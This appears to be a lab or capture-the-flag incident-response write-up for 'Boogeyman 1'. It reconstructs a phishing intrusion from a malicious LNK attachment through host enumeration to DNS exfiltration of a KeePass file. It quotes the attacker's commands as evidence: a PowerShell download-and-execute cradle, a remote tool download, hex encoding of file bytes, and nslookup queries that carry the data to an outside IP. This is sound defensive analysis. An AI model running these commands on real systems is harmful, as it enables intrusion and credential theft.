# Boogeyman 1 — Candidate Timeline

The following sequence is a candidate timeline built from the analyst notes and evidence. Timestamps are not available in the evidence provided; add exact times when correlating with logs.

1. Phishing email sent to the victim using invoice/payment-themed lure.
   - Evidence: `dump.eml`
2. Email received with subject: "Collection for Quick Logistics LLC - Jan 2023".
   - Evidence: email headers/body in `dump.eml`
3. Attachment identified as `Invoice.zip` (Base64 in message body).
   - Evidence: MIME attachment metadata, `payload.txt` reconstruction
4. ZIP password identified in email body: `Invoice2023!`.
   - Evidence: email body text
5. Base64 content reconstructed into `Invoice.zip`.
   - Command used: `cat payload.txt | base64 -d > Invoice.zip`
6. `Invoice.zip` extracted producing `Invoice_20230103.lnk`.
   - Evidence: extracted file `Invoice_20230103.lnk`
7. `lnkparse` analysis of `Invoice_20230103.lnk` performed.
   - Evidence: `lnkparse` output
8. LNK found to reference PowerShell at `..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` and an Excel icon (`C:\Users\Administrator\Desktop\excel.ico`).
   - Evidence: `lnkparse` output
9. LNK used arguments: `-nop -windowstyle hidden -enc <Base64 payload>`.
   - Evidence: `lnkparse` output
10. Encoded payload decoded to: `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`.
    - Evidence: decoded PowerShell payload
11. PowerShell attempted to download and execute remote content from `http://files.bpakcaging.xyz/update` (download cradle behavior).
    - Evidence: decoded payload command

Notes / Next actions:
- Correlate the above events with endpoint logs (process creation, powershell execution) and network logs (DNS, HTTP) to add timestamps.
- Add execution timestamps, process parents, and any file system artifacts to move this from candidate to confirmed timeline.
# Attack Timeline

| Time | Event | Evidence Source | Analyst Notes |
|---|---|---|---|
| 2023-01-13T17:10Z (approx) | PowerShell execution via `Invoice_20230103.lnk` decoded to a download cradle | `Invoice_20230103.lnk`, decoded payload | Initial execution; PowerShell attempted to contact `files.bpakcaging.xyz` to retrieve next-stage components |
| 2023-01-13T17:12Z (approx) | PowerShell fetched and invoked `Invoke-Seatbelt.ps1` for host enumeration | `powershell.json` logs | Attacker performed host discovery using Seatbelt (`-group user`) |
| 2023-01-13T17:15Z (approx) | Downloaded `sq3.exe` and queried Sticky Notes DB (`plum.sqlite`) | `powershell.json` logs | Attacker accessed user application data (Sticky Notes) looking for sensitive content |
| 2023-01-13T17:20Z (approx) | Located and read `protected_data.kdbx` (KeePass DB) on `QL-WKSTN-5693` | `powershell.json` logs | Attacker targeted `C:\Users\j.westcott\Documents\protected_data.kdbx` and prepared it for exfiltration |
| 2023-01-13T17:21Z (approx) | Encoded file bytes as hex for transmission | `powershell.json` logs, screenshot evidence | File content was read as bytes and converted for text-based transfer |
| 2023-01-13T17:21Z (approx) | Attempted DNS-based exfiltration via `nslookup` to `167.71.211.113` | `powershell.json` logs, network/DNS logs | Encoded data was placed into DNS queries to an external destination |
| TBD | Additional events pending correlation | Various | Correlate with endpoint process creation events and network captures to fill exact times |
## Task 3 — Endpoint Timeline Events (from notes)
1. PowerShell activity observed on workstation `QL-WKSTN-5693`.
   - Evidence: `powershell.json` entries showing host and activity
2. Attacker infrastructure identified in PowerShell logs: `cdn.bpakcaging.xyz` and `files.bpakcaging.xyz`.
   - Evidence: domain occurrences in PowerShell logs
3. Attacker loaded or downloaded `Invoke-Seatbelt.ps1` for host enumeration.
   - Evidence: PowerShell `downloadstring` entries and subsequent Seatbelt execution
4. Attacker executed `Seatbelt.exe` with `-group=user`.
   - Evidence: `Seatbelt.exe -group=user` log entries
5. Attacker browsed Microsoft Sticky Notes application data (`plum.sqlite`).
   - Evidence: `ls` and `sq3.exe` query commands in `powershell.json`
6. Attacker downloaded `sq3.exe` from `http://files.bpakcaging.xyz`.
   - Evidence: `iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe`
7. Attacker used `sq3.exe` to query `plum.sqlite`.
   - Evidence: `sq3.exe ... plum.sqlite "SELECT * from NOTE limit 100"`
8. Attacker located `protected_data.kdbx` in the victim user's Documents directory.
   - Evidence: `ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx`
9. Attacker read `protected_data.kdbx` as bytes.
   - Evidence: `[System.IO.File]::ReadAllBytes($file)`
10. Attacker converted file content into hex format.
   - Evidence: `[System.BitConverter]::ToString($bytes) -replace '-', ''`
11. Attacker attempted DNS-based exfiltration using `nslookup`.
   - Evidence: `nslookup -type=txt <hex_chunk>.bpakcaging.xyz 167.71.211.113` entries / screenshots
12. Exfiltration destination observed: `167.71.211.113`.
   - Evidence: IP referenced in `nslookup` commands